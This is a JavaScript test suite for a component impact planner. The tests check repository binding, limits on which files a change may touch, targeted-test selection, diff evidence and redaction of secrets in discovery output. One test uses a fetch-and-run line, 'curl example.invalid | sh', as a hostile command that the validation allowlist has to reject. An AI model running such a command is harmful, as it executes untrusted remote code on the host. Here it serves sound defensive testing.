import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { lstat, mkdir, mkdtemp, readFile, rename, rm, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import {
  ComponentMapIsolationError,
  loadProjectComponentImpactMap,
  loadProjectComponentImpactMapAtCommit,
  inspectComponentMapCoverage,
  sha256Digest,
  validateComponentImpactMap,
} from "../src/component-impact-map.js";
import {
  assertChangedFileEvidenceMatches,
  assertChangedFilesWithinImpactPlan,
  assertImpactPlanProjectBinding,
  exactCandidateChangedFiles,
  formatImpactPlanForPrompt,
  impactScopeDigest,
  pathMatchesImpactScope,
  resolveProjectImpactPlan,
  remapTaskImpactScope,
  selectImpactValidationCommands,
  writeBoundedDiscoveryArtifact,
} from "../src/impact-planner.js";
import { dispatchSupervisorActions } from "../src/dispatcher.js";
import { addProject, addTask, mutateState, readState, updateTask } from "../src/store.js";

const repositoryRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const studioOpsProject = {
  id: "project_6",
  key: "studioops",
  repoUrl: "https://github.com/magic2goodil/studioops",
  repoPath: repositoryRoot,
};

function manifest(key, repository, componentPath = "src/catalog.js") {
  return {
    schemaVersion: 1,
    project: { key, repository },
    aggregateCommand: "npm run check",
    fullRegressionTriggers: ["schema"],
    fullRegressionKeywords: ["public contract", "authorization"],
    releaseSensitivePaths: ["src/catalog-api.js"],
    prohibitedDependencies: [],
    components: {
      catalog: {
        owner: "catalog-owner",
        aliases: ["audio catalog"],
        capabilities: ["library browsing"],
        paths: [componentPath, "src/catalog-api.js", "test/catalog.test.js"],
        routes: ["/catalog"],
        ui: ["catalog screen"],
        services: ["catalog service"],
        data: ["catalog items"],
        publicContracts: ["catalog query API"],
        tests: [{ command: "node --test test/catalog.test.js", layer: "unit" }],
        reviewOwners: ["backend-reviewer"],
        fullRegressionPaths: ["src/catalog-api.js"],
        dependsOn: [],
        rollback: "Restore the previous catalog adapter.",
      },
    },
  };
}

async function writeManifest(root, value) {
  await mkdir(path.join(root, "docs", "architecture"), { recursive: true });
  await writeFile(path.join(root, "docs", "architecture", "components.json"), `${JSON.stringify(value, null, 2)}\n`);
}

test("component maps are canonical, validated, and content addressed", () => {
  const first = validateComponentImpactMap(manifest("dollos", "https://github.com/example/dollos.git"));
  const second = validateComponentImpactMap({
    ...manifest("dollos", "git@github.com:example/dollos.git"),
    fullRegressionTriggers: ["schema"],
  });
  assert.equal(first.project.repository, "https://github.com/example/dollos");
  assert.equal(first.project.repository, second.project.repository);
  assert.equal(sha256Digest(first), sha256Digest(structuredClone(first)));
  assert.throws(() => validateComponentImpactMap({ ...manifest("dollos", "https://github.com/example/dollos"), schemaVersion: 2 }), /Unsupported/);
});

test("checked-in StudioOps primary map is repository-bound and has unique authorities", () => {
  const loaded = loadProjectComponentImpactMap(studioOpsProject);
  assert.equal(loaded.status, "mapped");
  assert.equal(loaded.reason, "component_map_loaded");
  assert.equal(loaded.path, "docs/architecture/components.json");
  assert.equal(loaded.manifest.project.key, studioOpsProject.key);
  assert.equal(loaded.manifest.project.repository, studioOpsProject.repoUrl);
  assert.equal(loaded.digest, sha256Digest(loaded.manifest));
  assert.equal(loaded.coverage.checked, true);
  assert.equal(loaded.coverage.complete, true, JSON.stringify(loaded.coverage));
  assert.ok(loaded.coverage.fileCount > 100);

  const ownedPaths = Object.values(loaded.manifest.components).flatMap((component) => component.paths);
  const policyAuthorities = Object.values(loaded.manifest.components)
    .flatMap((component) => component.policyAuthorities);
  assert.equal(new Set(ownedPaths).size, ownedPaths.length);
  assert.equal(new Set(policyAuthorities).size, policyAuthorities.length);

  assert.throws(
    () => loadProjectComponentImpactMap({
      ...studioOpsProject,
      repoUrl: "https://github.com/example/not-studioops",
    }),
    ComponentMapIsolationError,
  );
});

test("checked-in StudioOps map produces a bounded single-component context packet", () => {
  const loaded = loadProjectComponentImpactMap(studioOpsProject);
  const plan = resolveProjectImpactPlan({
    project: studioOpsProject,
    task: {
      title: "Extend component impact test coverage",
      workAreas: ["test/component-impact-map.test.js"],
    },
    sourceCommit: "a".repeat(40),
    loadedMap: loaded,
  });

  assert.equal(plan.status, "mapped");
  assert.equal(plan.fullRegression, false);
  assert.deepEqual(plan.reasonCodes, ["single_component_mapped"]);
  assert.deepEqual(plan.selectedComponents.map((component) => component.id), ["component-impact-planning"]);
  assert.deepEqual(plan.allowedFileScope, [
    "docs/architecture/*.components.json",
    "docs/architecture/component-mapping.md",
    "docs/architecture/components.json",
    "src/component-impact-map.js",
    "src/impact-planner.js",
    "test/component-impact-map.test.js",
  ]);
  assert.deepEqual(plan.targetedTests, ["node scripts/run-tests.js --test-file test/component-impact-map.test.js"]);
  assert.deepEqual(plan.requiredReviewLanes, ["backend-reviewer", "lead-reviewer"]);
  assertImpactPlanProjectBinding(plan, studioOpsProject);

  const packet = formatImpactPlanForPrompt(plan);
  assert.match(packet, /Project binding: project_6\/studioops @ https:\/\/github\.com\/magic2goodil\/studioops/);
  assert.match(packet, /Selected components: component-impact-planning/);
  assert.match(packet, /Targeted implementation tests: node scripts\/run-tests\.js --test-file test\/component-impact-map\.test\.js/);
});

test("StudioOps scoped commands bootstrap isolation and cover every owned test", () => {
  const loaded = loadProjectComponentImpactMap(studioOpsProject);
  const testFiles = [...new Set(execFileSync("git", ["ls-files", "--cached", "--others", "--exclude-standard", "-z", "--", "test"],
    { cwd: repositoryRoot, encoding: "utf8" }).split("\0"))].filter((file) => file.endsWith(".test.js"));
  for (const component of Object.values(loaded.manifest.components)) {
    if (component.id === "repository-composition") {
      assert.deepEqual(component.tests.map((entry) => entry.command), ["npm run check"]);
      continue;
    }
    const selectedTests = [];
    for (const { command } of component.tests) {
      assert.match(command, /^node scripts\/run-tests\.js(?: --test-file [a-zA-Z0-9_./-]+\.test\.js)+$/, `${component.id} must use hermetic test execution`);
      selectedTests.push(...[...command.matchAll(/ --test-file ([a-zA-Z0-9_./-]+\.test\.js)/g)].map((match) => match[1]));
    }
    const ownedTests = testFiles.filter((file) => component.paths.some((scope) => pathMatchesImpactScope(file, scope)));
    assert.deepEqual([...new Set(selectedTests)].sort(), ownedTests.sort(), `${component.id} must execute every owned test`);
  }
  const plan = resolveProjectImpactPlan({ project: studioOpsProject, loadedMap: loaded,
    task: { title: "Adjust owner inbox grouping", workAreas: ["src/owner-inbox.js"] } });
  assert.equal(plan.fullRegression, false, "the regression must exercise an eligible scoped component");
  assert.equal(plan.selectedComponents[0].id, "owner-console");
  assert.match(plan.targetedTests.join("\n"), /--test-file test\/owner-inbox\.test\.js(?: |$)/);
});

test("checked-in StudioOps map fails closed for uncertain and release-sensitive impact", () => {
  const loaded = loadProjectComponentImpactMap(studioOpsProject);
  const cases = [
    {
      name: "unknown",
      task: { title: "Adjust unmapped module", workAreas: ["src/not-owned.js"] },
      reasons: ["unclassified_impact", "declared_path_unmapped", "immutable_diff_path_unmapped"],
    },
    {
      name: "shared",
      task: { title: "Adjust repository scripts", workAreas: ["package.json"] },
      reasons: ["shared_component_impact", "release_sensitive_impact"],
    },
    {
      name: "multi-component",
      task: {
        title: "Adjust component planning and task state",
        workAreas: ["test/component-impact-map.test.js", "test/state-database.test.js"],
      },
      reasons: ["multi_component_impact", "shared_component_impact"],
    },
    {
      name: "release-sensitive",
      task: { title: "Adjust impact planner", workAreas: ["src/impact-planner.js"] },
      reasons: ["release_sensitive_impact"],
    },
  ];

  for (const entry of cases) {
    const plan = resolveProjectImpactPlan({
      project: studioOpsProject,
      task: entry.task,
      sourceCommit: "a".repeat(40),
      loadedMap: loaded,
    });
    assert.equal(plan.fullRegression, true, `${entry.name} impact must require full regression`);
    for (const reason of entry.reasons) {
      assert.ok(plan.reasonCodes.includes(reason), `${entry.name} impact must include ${reason}`);
    }
  }
});

test("repository identity prevents cross-project lookup even with identical component names", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-component-isolation-"));
  const dollosRoot = path.join(root, "dollos");
  const teamRoot = path.join(root, "team-robison");
  await writeManifest(dollosRoot, manifest("dollos", "https://github.com/example/dollos", "src/dollos-catalog.js"));
  await writeManifest(teamRoot, manifest("team-robison", "https://github.com/example/team-robison", "src/team-catalog.js"));
  try {
    const dollos = loadProjectComponentImpactMap({
      id: "project_1", key: "dollos", repoUrl: "https://github.com/example/dollos", repoPath: dollosRoot,
    });
    const team = loadProjectComponentImpactMap({
      id: "project_2", key: "team-robison", repoUrl: "https://github.com/example/team-robison", repoPath: teamRoot,
    });
    assert.deepEqual(dollos.manifest.components.catalog.paths, ["src/dollos-catalog.js", "src/catalog-api.js", "test/catalog.test.js"]);
    assert.deepEqual(team.manifest.components.catalog.paths, ["src/team-catalog.js", "src/catalog-api.js", "test/catalog.test.js"]);
    assert.notEqual(dollos.digest, team.digest);
    assert.throws(() => loadProjectComponentImpactMap({
      id: "project_1", key: "dollos", repoUrl: "https://github.com/example/dollos", repoPath: teamRoot,
    }), ComponentMapIsolationError);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("candidate remapping reads the exact commit without crossing repository authority", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-candidate-map-"));
  const project = {
    id: "project_1",
    key: "dollos",
    repoUrl: "https://github.com/example/dollos",
    repoPath: root,
  };
  try {
    execFileSync("git", ["init", "-q"], { cwd: root });
    execFileSync("git", ["config", "user.email", "studioops@example.invalid"], { cwd: root });
    execFileSync("git", ["config", "user.name", "StudioOps Test"], { cwd: root });
    execFileSync("git", ["remote", "add", "origin", `${project.repoUrl}.git`], { cwd: root });
    await writeManifest(root, manifest(project.key, project.repoUrl, "src/original-catalog.js"));
    execFileSync("git", ["add", "."], { cwd: root });
    execFileSync("git", ["commit", "-qm", "base map"], { cwd: root });
    const baseSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: root, encoding: "utf8" }).trim();
    await writeManifest(root, manifest(project.key, project.repoUrl, "src/candidate-catalog.js"));
    execFileSync("git", ["add", "."], { cwd: root });
    execFileSync("git", ["commit", "-qm", "candidate map"], { cwd: root });
    const candidateSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: root, encoding: "utf8" }).trim();
    execFileSync("git", ["checkout", "--detach", "-q", baseSha], { cwd: root });

    const checkedOut = loadProjectComponentImpactMap(project);
    const candidate = loadProjectComponentImpactMapAtCommit(project, candidateSha);
    assert.deepEqual(checkedOut.manifest.components.catalog.paths[0], "src/original-catalog.js");
    assert.deepEqual(candidate.manifest.components.catalog.paths[0], "src/candidate-catalog.js");
    assert.notEqual(candidate.digest, checkedOut.digest);
    assert.equal(candidate.sourceCommit, candidateSha);
    assert.throws(
      () => loadProjectComponentImpactMapAtCommit({ ...project, repoUrl: "https://github.com/example/team-robison" }, candidateSha),
      ComponentMapIsolationError,
    );
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("planner emits a narrow context packet and targeted tests for mapped work", () => {
  const project = { id: "project_1", key: "dollos", repoUrl: "https://github.com/example/dollos" };
  const normalized = validateComponentImpactMap(manifest("dollos", project.repoUrl));
  const plan = resolveProjectImpactPlan({
    project,
    task: {
      title: "Update the audio catalog",
      workAreas: ["src/catalog.js", "test/catalog.test.js"],
    },
    sourceCommit: "a".repeat(40),
    loadedMap: { status: "mapped", reason: "component_map_loaded", manifest: normalized, digest: sha256Digest(normalized), path: "docs/architecture/components.json" },
  });
  assert.equal(plan.status, "mapped");
  assert.equal(plan.fullRegression, false);
  assert.deepEqual(plan.selectedComponents.map((item) => item.id), ["catalog"]);
  assert.deepEqual(plan.targetedTests, ["node --test test/catalog.test.js"]);
  assertImpactPlanProjectBinding(plan, project);
  assert.match(formatImpactPlanForPrompt(plan), /SCOPED CONTEXT PACKET/);
  assert.match(formatImpactPlanForPrompt(plan), /not the raw file-byte hash/);
  assert.match(formatImpactPlanForPrompt(plan), /Do not list or broadly search/);
});

test("unmapped, sensitive, shared, and multi-component impact fails closed", () => {
  const project = { id: "project_1", key: "dollos", repoUrl: "https://github.com/example/dollos" };
  const raw = manifest("dollos", project.repoUrl);
  raw.components.identity = {
    owner: "identity-owner",
    aliases: ["authorization"],
    paths: ["src/auth.js"],
    services: ["authorization service"],
    publicContracts: ["authorization decision"],
    tests: ["node --test test/auth.test.js"],
    reviewOwners: ["security-reviewer"],
    fullRegressionPaths: ["src/auth.js"],
    dependsOn: [],
    shared: true,
    rollback: "Disable the new authorization path.",
  };
  const normalized = validateComponentImpactMap(raw);
  const plan = resolveProjectImpactPlan({
    project,
    task: { title: "Change catalog authorization", workAreas: ["src/catalog.js", "src/auth.js"] },
    loadedMap: { status: "mapped", manifest: normalized, digest: sha256Digest(normalized), path: "docs/architecture/components.json" },
  });
  assert.equal(plan.fullRegression, true);
  assert.ok(plan.reasonCodes.includes("multi_component_impact"));
  assert.ok(plan.reasonCodes.includes("shared_component_impact"));
  assert.ok(plan.reasonCodes.includes("release_sensitive_impact"));
});

test("changed files outside the content-addressed scope block handoff", () => {
  const plan = {
    status: "mapped",
    allowedFileScope: ["src/catalog.js", "test/**"],
  };
  assert.equal(pathMatchesImpactScope("test/unit/catalog.test.js", "test/**"), true);
  assert.equal(assertChangedFilesWithinImpactPlan(plan, ["src/catalog.js", "test/unit/catalog.test.js"]), true);
  assert.throws(
    () => assertChangedFilesWithinImpactPlan(plan, ["src/catalog.js", "src/payments.js"]),
    (error) => error.code === "impact_scope_mismatch" && error.outsideFiles.includes("src/payments.js"),
  );
});

test("schema rejects duplicate path and policy authorities plus prohibited edges", () => {
  const raw = manifest("dollos", "https://github.com/example/dollos");
  raw.components.other = {
    owner: "other-owner",
    paths: ["src/catalog.js"],
    services: ["other service"],
    publicContracts: ["other contract"],
    policyAuthorities: ["catalog policy"],
    tests: ["node --test test/other.test.js"],
    reviewOwners: ["backend-reviewer"],
    dependsOn: [],
    rollback: "Remove the other adapter.",
  };
  raw.components.catalog.policyAuthorities = ["catalog policy"];
  assert.throws(() => validateComponentImpactMap(raw), /duplicate component authorities/);

  raw.components.other.paths = ["src/other.js"];
  assert.throws(() => validateComponentImpactMap(raw), /duplicate component authorities/);

  raw.components.other.policyAuthorities = ["other policy"];
  raw.components.other.dependsOn = ["catalog"];
  raw.prohibitedDependencies = [{ from: "other", to: "catalog" }];
  assert.throws(() => validateComponentImpactMap(raw), /is prohibited/);
});

test("immutable changed paths and public-contract paths force full regression", () => {
  const project = { id: "project_1", key: "dollos", repoUrl: "https://github.com/example/dollos" };
  const normalized = validateComponentImpactMap(manifest("dollos", project.repoUrl));
  const plan = resolveProjectImpactPlan({
    project,
    task: {
      title: "Adjust catalog response",
      workAreas: ["src/catalog-api.js"],
      candidateIdentity: {
        baseSha: "a".repeat(40),
        commitSha: "b".repeat(40),
        impactEvidence: { changedFiles: ["src/catalog-api.js"] },
      },
    },
    loadedMap: { status: "mapped", manifest: normalized, digest: sha256Digest(normalized), path: "docs/architecture/components.json" },
  });
  assert.equal(plan.candidateBinding.classificationSource, "immutable_git_diff");
  assert.equal(plan.fullRegression, true);
  assert.ok(plan.reasonCodes.includes("release_sensitive_impact"));
});

test("changed-file evidence is recomputed from the exact local Git candidate", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-exact-diff-"));
  try {
    execFileSync("git", ["init", "-q"], { cwd: root });
    execFileSync("git", ["config", "user.email", "studioops@example.invalid"], { cwd: root });
    execFileSync("git", ["config", "user.name", "StudioOps Test"], { cwd: root });
    await mkdir(path.join(root, "src"), { recursive: true });
    await writeFile(path.join(root, "src", "catalog.js"), "export const catalog = 1;\n");
    execFileSync("git", ["add", "."], { cwd: root });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: root });
    const baseSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: root, encoding: "utf8" }).trim();
    await writeFile(path.join(root, "src", "catalog.js"), "export const catalog = 2;\n");
    await writeFile(path.join(root, "src", "payments.js"), "export const payments = true;\n");
    execFileSync("git", ["add", "."], { cwd: root });
    execFileSync("git", ["commit", "-qm", "candidate"], { cwd: root });
    const commitSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: root, encoding: "utf8" }).trim();
    const actual = exactCandidateChangedFiles({ id: "project_1", key: "dollos", repoPath: root }, { baseSha, commitSha }, { cwd: root });
    assert.deepEqual(actual, ["src/catalog.js", "src/payments.js"]);
    assert.throws(
      () => assertChangedFileEvidenceMatches(actual, ["src/catalog.js"]),
      (error) => error.code === "candidate_diff_evidence_mismatch" && error.omittedFiles.includes("src/payments.js"),
    );
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("immutable diff includes deletion, both rename paths, and file type changes", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-all-diff-statuses-"));
  const git = (...args) => execFileSync("git", args, { cwd: root, encoding: "utf8" }).trim();
  try {
    git("init", "-q");
    git("config", "user.email", "studioops@example.invalid");
    git("config", "user.name", "StudioOps Test");
    await mkdir(path.join(root, "src"));
    for (const name of ["deleted.js", "renamed.js", "type.js"]) await writeFile(path.join(root, "src", name), `export const value = ${JSON.stringify(name)};\n`);
    git("add", "."); git("commit", "-qm", "base");
    const baseSha = git("rev-parse", "HEAD");
    await rm(path.join(root, "src", "deleted.js"));
    await rename(path.join(root, "src", "renamed.js"), path.join(root, "src", "new-name.js"));
    await rm(path.join(root, "src", "type.js"));
    await symlink("new-name.js", path.join(root, "src", "type.js"));
    git("add", "."); git("commit", "-qm", "candidate");
    assert.deepEqual(exactCandidateChangedFiles({ key: "diff-statuses", repoPath: root }, { baseSha, commitSha: git("rev-parse", "HEAD") }, { cwd: root }),
      ["src/deleted.js", "src/new-name.js", "src/renamed.js", "src/type.js"]);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("coverage detects uncovered files and overlapping glob ownership", () => {
  const raw = manifest("dollos", "https://github.com/example/dollos");
  raw.coverageRoots = ["src", "test"];
  let normalized = validateComponentImpactMap(raw);
  const missing = inspectComponentMapCoverage(normalized, ["src/catalog.js", "src/new-module.js", "README.md"]);
  assert.equal(missing.fileCount, 2);
  assert.deepEqual(missing.uncoveredFiles, ["src/new-module.js"]);
  raw.components.storage = { ...raw.components.catalog, paths: ["src/**"], policyAuthorities: [] };
  normalized = validateComponentImpactMap(raw);
  assert.deepEqual(inspectComponentMapCoverage(normalized, ["src/catalog.js"]).conflictingFiles,
    [{ path: "src/catalog.js", owners: ["catalog", "storage"] }]);
  const plan = resolveProjectImpactPlan({ project: { key: "dollos", repoUrl: raw.project.repository }, task: { workAreas: ["src/catalog.js"] },
    loadedMap: { status: "drifted", manifest: validateComponentImpactMap({ ...raw, components: { catalog: raw.components.catalog } }), coverage: missing } });
  assert.equal(plan.fullRegression, true);
  assert.ok(plan.reasonCodes.includes("component_map_coverage_drift"));
});

test("dependency context and dependent tests do not widen editable scope", () => {
  const raw = manifest("dollos", "https://github.com/example/dollos");
  raw.components.storage = { ...raw.components.catalog, paths: ["src/storage.js"], tests: ["node --test test/storage.test.js"], dependsOn: [] };
  raw.components.catalog.dependsOn = ["storage"];
  raw.components.checkout = { ...raw.components.catalog, paths: ["src/checkout.js"], tests: ["node --test test/checkout.test.js"], dependsOn: ["catalog"] };
  const plan = resolveProjectImpactPlan({ project: { key: "dollos", repoUrl: raw.project.repository }, task: { workAreas: ["src/catalog.js"] },
    loadedMap: { status: "mapped", manifest: validateComponentImpactMap(raw) } });
  assert.deepEqual(plan.supportingFileScope, ["src/storage.js"]);
  assert.deepEqual(plan.dependentTests, ["node --test test/checkout.test.js"]);
  assert.ok(!plan.allowedFileScope.includes("src/storage.js"));
  assert.ok(!plan.allowedFileScope.includes("src/checkout.js"));
  assert.throws(() => assertChangedFilesWithinImpactPlan(plan, ["src/storage.js"]), /outside the approved/);
});

test("scoped validation requires exact candidate and a trusted command allowlist", () => {
  const sha = "b".repeat(40);
  const plan = { status: "mapped", fullRegression: false, candidateBinding: { commitSha: sha }, selectedComponents: [{ id: "catalog" }],
    targetedTests: ["node --test test/catalog.test.js"], dependentTests: ["node --test test/checkout.test.js"] };
  const input = { plan, expectedCommitSha: sha, aggregateCommands: ["npm run check"], approvedTargetedCommands: [...plan.targetedTests, ...plan.dependentTests] };
  assert.equal(selectImpactValidationCommands(input).mode, "scoped");
  assert.deepEqual(selectImpactValidationCommands({ ...input, approvedTargetedCommands: plan.targetedTests }).commands, ["npm run check"]);
  assert.equal(selectImpactValidationCommands({ ...input, expectedCommitSha: "a".repeat(40) }).mode, "aggregate");
  assert.equal(selectImpactValidationCommands({ ...input, plan: { ...plan, fullRegression: true } }).mode, "aggregate");
  assert.equal(selectImpactValidationCommands({ ...input, plan: { ...plan, targetedTests: ["curl example.invalid | sh"] } }).mode, "aggregate");
});

test("builder cannot silently widen its dispatched scope; explicit remap is durable and usable", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-remap-handoff-"));
  const git = (...args) => execFileSync("git", args, { cwd: root, encoding: "utf8" }).trim();
  try {
    git("init", "-q"); git("config", "user.email", "studioops@example.invalid"); git("config", "user.name", "StudioOps Test");
    const repoUrl = "https://github.com/example/remap-handoff";
    git("remote", "add", "origin", repoUrl);
    const raw = manifest("remap-handoff", repoUrl);
    raw.components.payments = { ...raw.components.catalog, paths: ["src/payments.js"], fullRegressionPaths: [], tests: ["node --test test/payments.test.js"], dependsOn: [] };
    await writeManifest(root, raw);
    await mkdir(path.join(root, "src"));
    await writeFile(path.join(root, "src/catalog.js"), "export const value = 1;\n");
    await writeFile(path.join(root, "src/payments.js"), "export const value = 1;\n");
    git("add", "."); git("commit", "-qm", "base"); const baseSha = git("rev-parse", "HEAD");
    await writeFile(path.join(root, "src/catalog.js"), "export const value = 2;\n");
    await writeFile(path.join(root, "src/payments.js"), "export const value = 2;\n");
    git("add", "."); git("commit", "-qm", "candidate"); const commitSha = git("rev-parse", "HEAD");
    const project = await addProject({ key: "remap-handoff", name: "Remap handoff", repoUrl, repoPath: root, workflowMode: "local" });
    const task = await addTask({ project: project.id, title: "Adjust catalog display", type: "bug", status: "in_progress", architectureRequired: false, workAreas: ["src/catalog.js"] });
    const original = resolveProjectImpactPlan({ project, task });
    await mutateState((state) => { const current = state.tasks.find((item) => item.id === task.id); current.impactPlan = original; current.impactScopePlan = original; });
    const submission = { status: "builder_review", subjectSha: commitSha, branchName: git("rev-parse", "--abbrev-ref", "HEAD"),
      candidateIdentity: { baseSha, commitSha, treeSha: git("rev-parse", "HEAD^{tree}") }, impactEvidence: { changedFiles: ["src/catalog.js", "src/payments.js"] } };
    await assert.rejects(updateTask(task.id, submission), /outside the approved component scope/);
    const remap = { reason: "Catalog fix requires the adjacent payments adapter contract update.", workAreas: ["src/catalog.js", "src/payments.js"], expectedPlanDigest: impactScopeDigest(original) };
    assert.throws(() => remapTaskImpactScope(project, { ...task, impactScopePlan: original }, { ...remap, expectedPlanDigest: "stale" }), /digest is stale/);
    await assert.rejects(updateTask(task.id, { impactRemap: remap, status: "builder_review" }), /separately/);
    await updateTask(task.id, { impactRemap: remap });
    await updateTask(task.id, submission);
    const state = await readState();
    const updated = state.tasks.find((item) => item.id === task.id);
    assert.equal(updated.status, "builder_review");
    assert.equal(updated.impactPlan.fullRegression, true);
    assert.ok(updated.impactScopePlan.allowedFileScope.includes("src/payments.js"));
    assert.equal(state.events.filter((event) => event.taskId === task.id && event.type === "task_impact_scope_remapped").length, 1);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("exceptional discovery output is redacted, bounded, content addressed, and private", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-discovery-artifact-"));
  try {
    const artifact = await writeBoundedDiscoveryArtifact({
      artifactRoot: root,
      projectKey: "dollos",
      runId: "run_1",
      reasonCode: "unclassified_impact",
      output: `token=super-secret-value\n${"x".repeat(200)}`,
      maxBytes: 80,
    });
    const content = await readFile(artifact.path, "utf8");
    const info = await lstat(artifact.path);
    assert.equal(info.mode & 0o777, 0o600);
    assert.ok(Buffer.byteLength(content) <= 80);
    assert.doesNotMatch(content, /super-secret-value/);
    assert.match(content, /\[REDACTED\]/);
    assert.equal(artifact.truncated, true);
    assert.equal(artifact.digest, sha256Digest(Buffer.from(content)));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("dispatcher persists one repository-bound context packet on both run and task", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-context-packet-"));
  const project = {
    id: "project_1",
    key: "dollos",
    name: "DollOS",
    repoUrl: "https://github.com/example/dollos",
    repoPath: root,
  };
  await writeManifest(root, manifest(project.key, project.repoUrl));
  const task = {
    id: "task_1",
    projectId: project.id,
    title: "Update the audio catalog",
    description: "A small catalog presentation fix.",
    status: "ready",
    priority: "high",
    workAreas: ["src/catalog.js", "test/catalog.test.js"],
    architectureRequired: false,
    architectureStatus: "not_required",
  };
  const state = {
    projects: [project], tasks: [task], runs: [], comments: [], events: [], reviews: [],
  };
  try {
    const report = await dispatchSupervisorActions([{
      id: "task_1:start_builder",
      type: "start_builder",
      role: "builder",
      projectId: project.id,
      projectKey: project.key,
      projectName: project.name,
      taskId: task.id,
      taskTitle: task.title,
      taskStatus: "ready",
      nextStatus: "in_progress",
    }], { state });
    assert.equal(report.runs.length, 1);
    assert.equal(report.runs[0].impactPlan.project.id, project.id);
    assert.equal(report.runs[0].impactPlan.project.repository, "https://github.com/example/dollos");
    assert.deepEqual(report.runs[0].fileScope, ["src/catalog-api.js", "src/catalog.js", "test/catalog.test.js"]);
    assert.equal(task.impactPlan.manifest.digest, report.runs[0].impactPlan.manifest.digest);
    assert.deepEqual(task.impactScopePlan.allowedFileScope, report.runs[0].fileScope);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
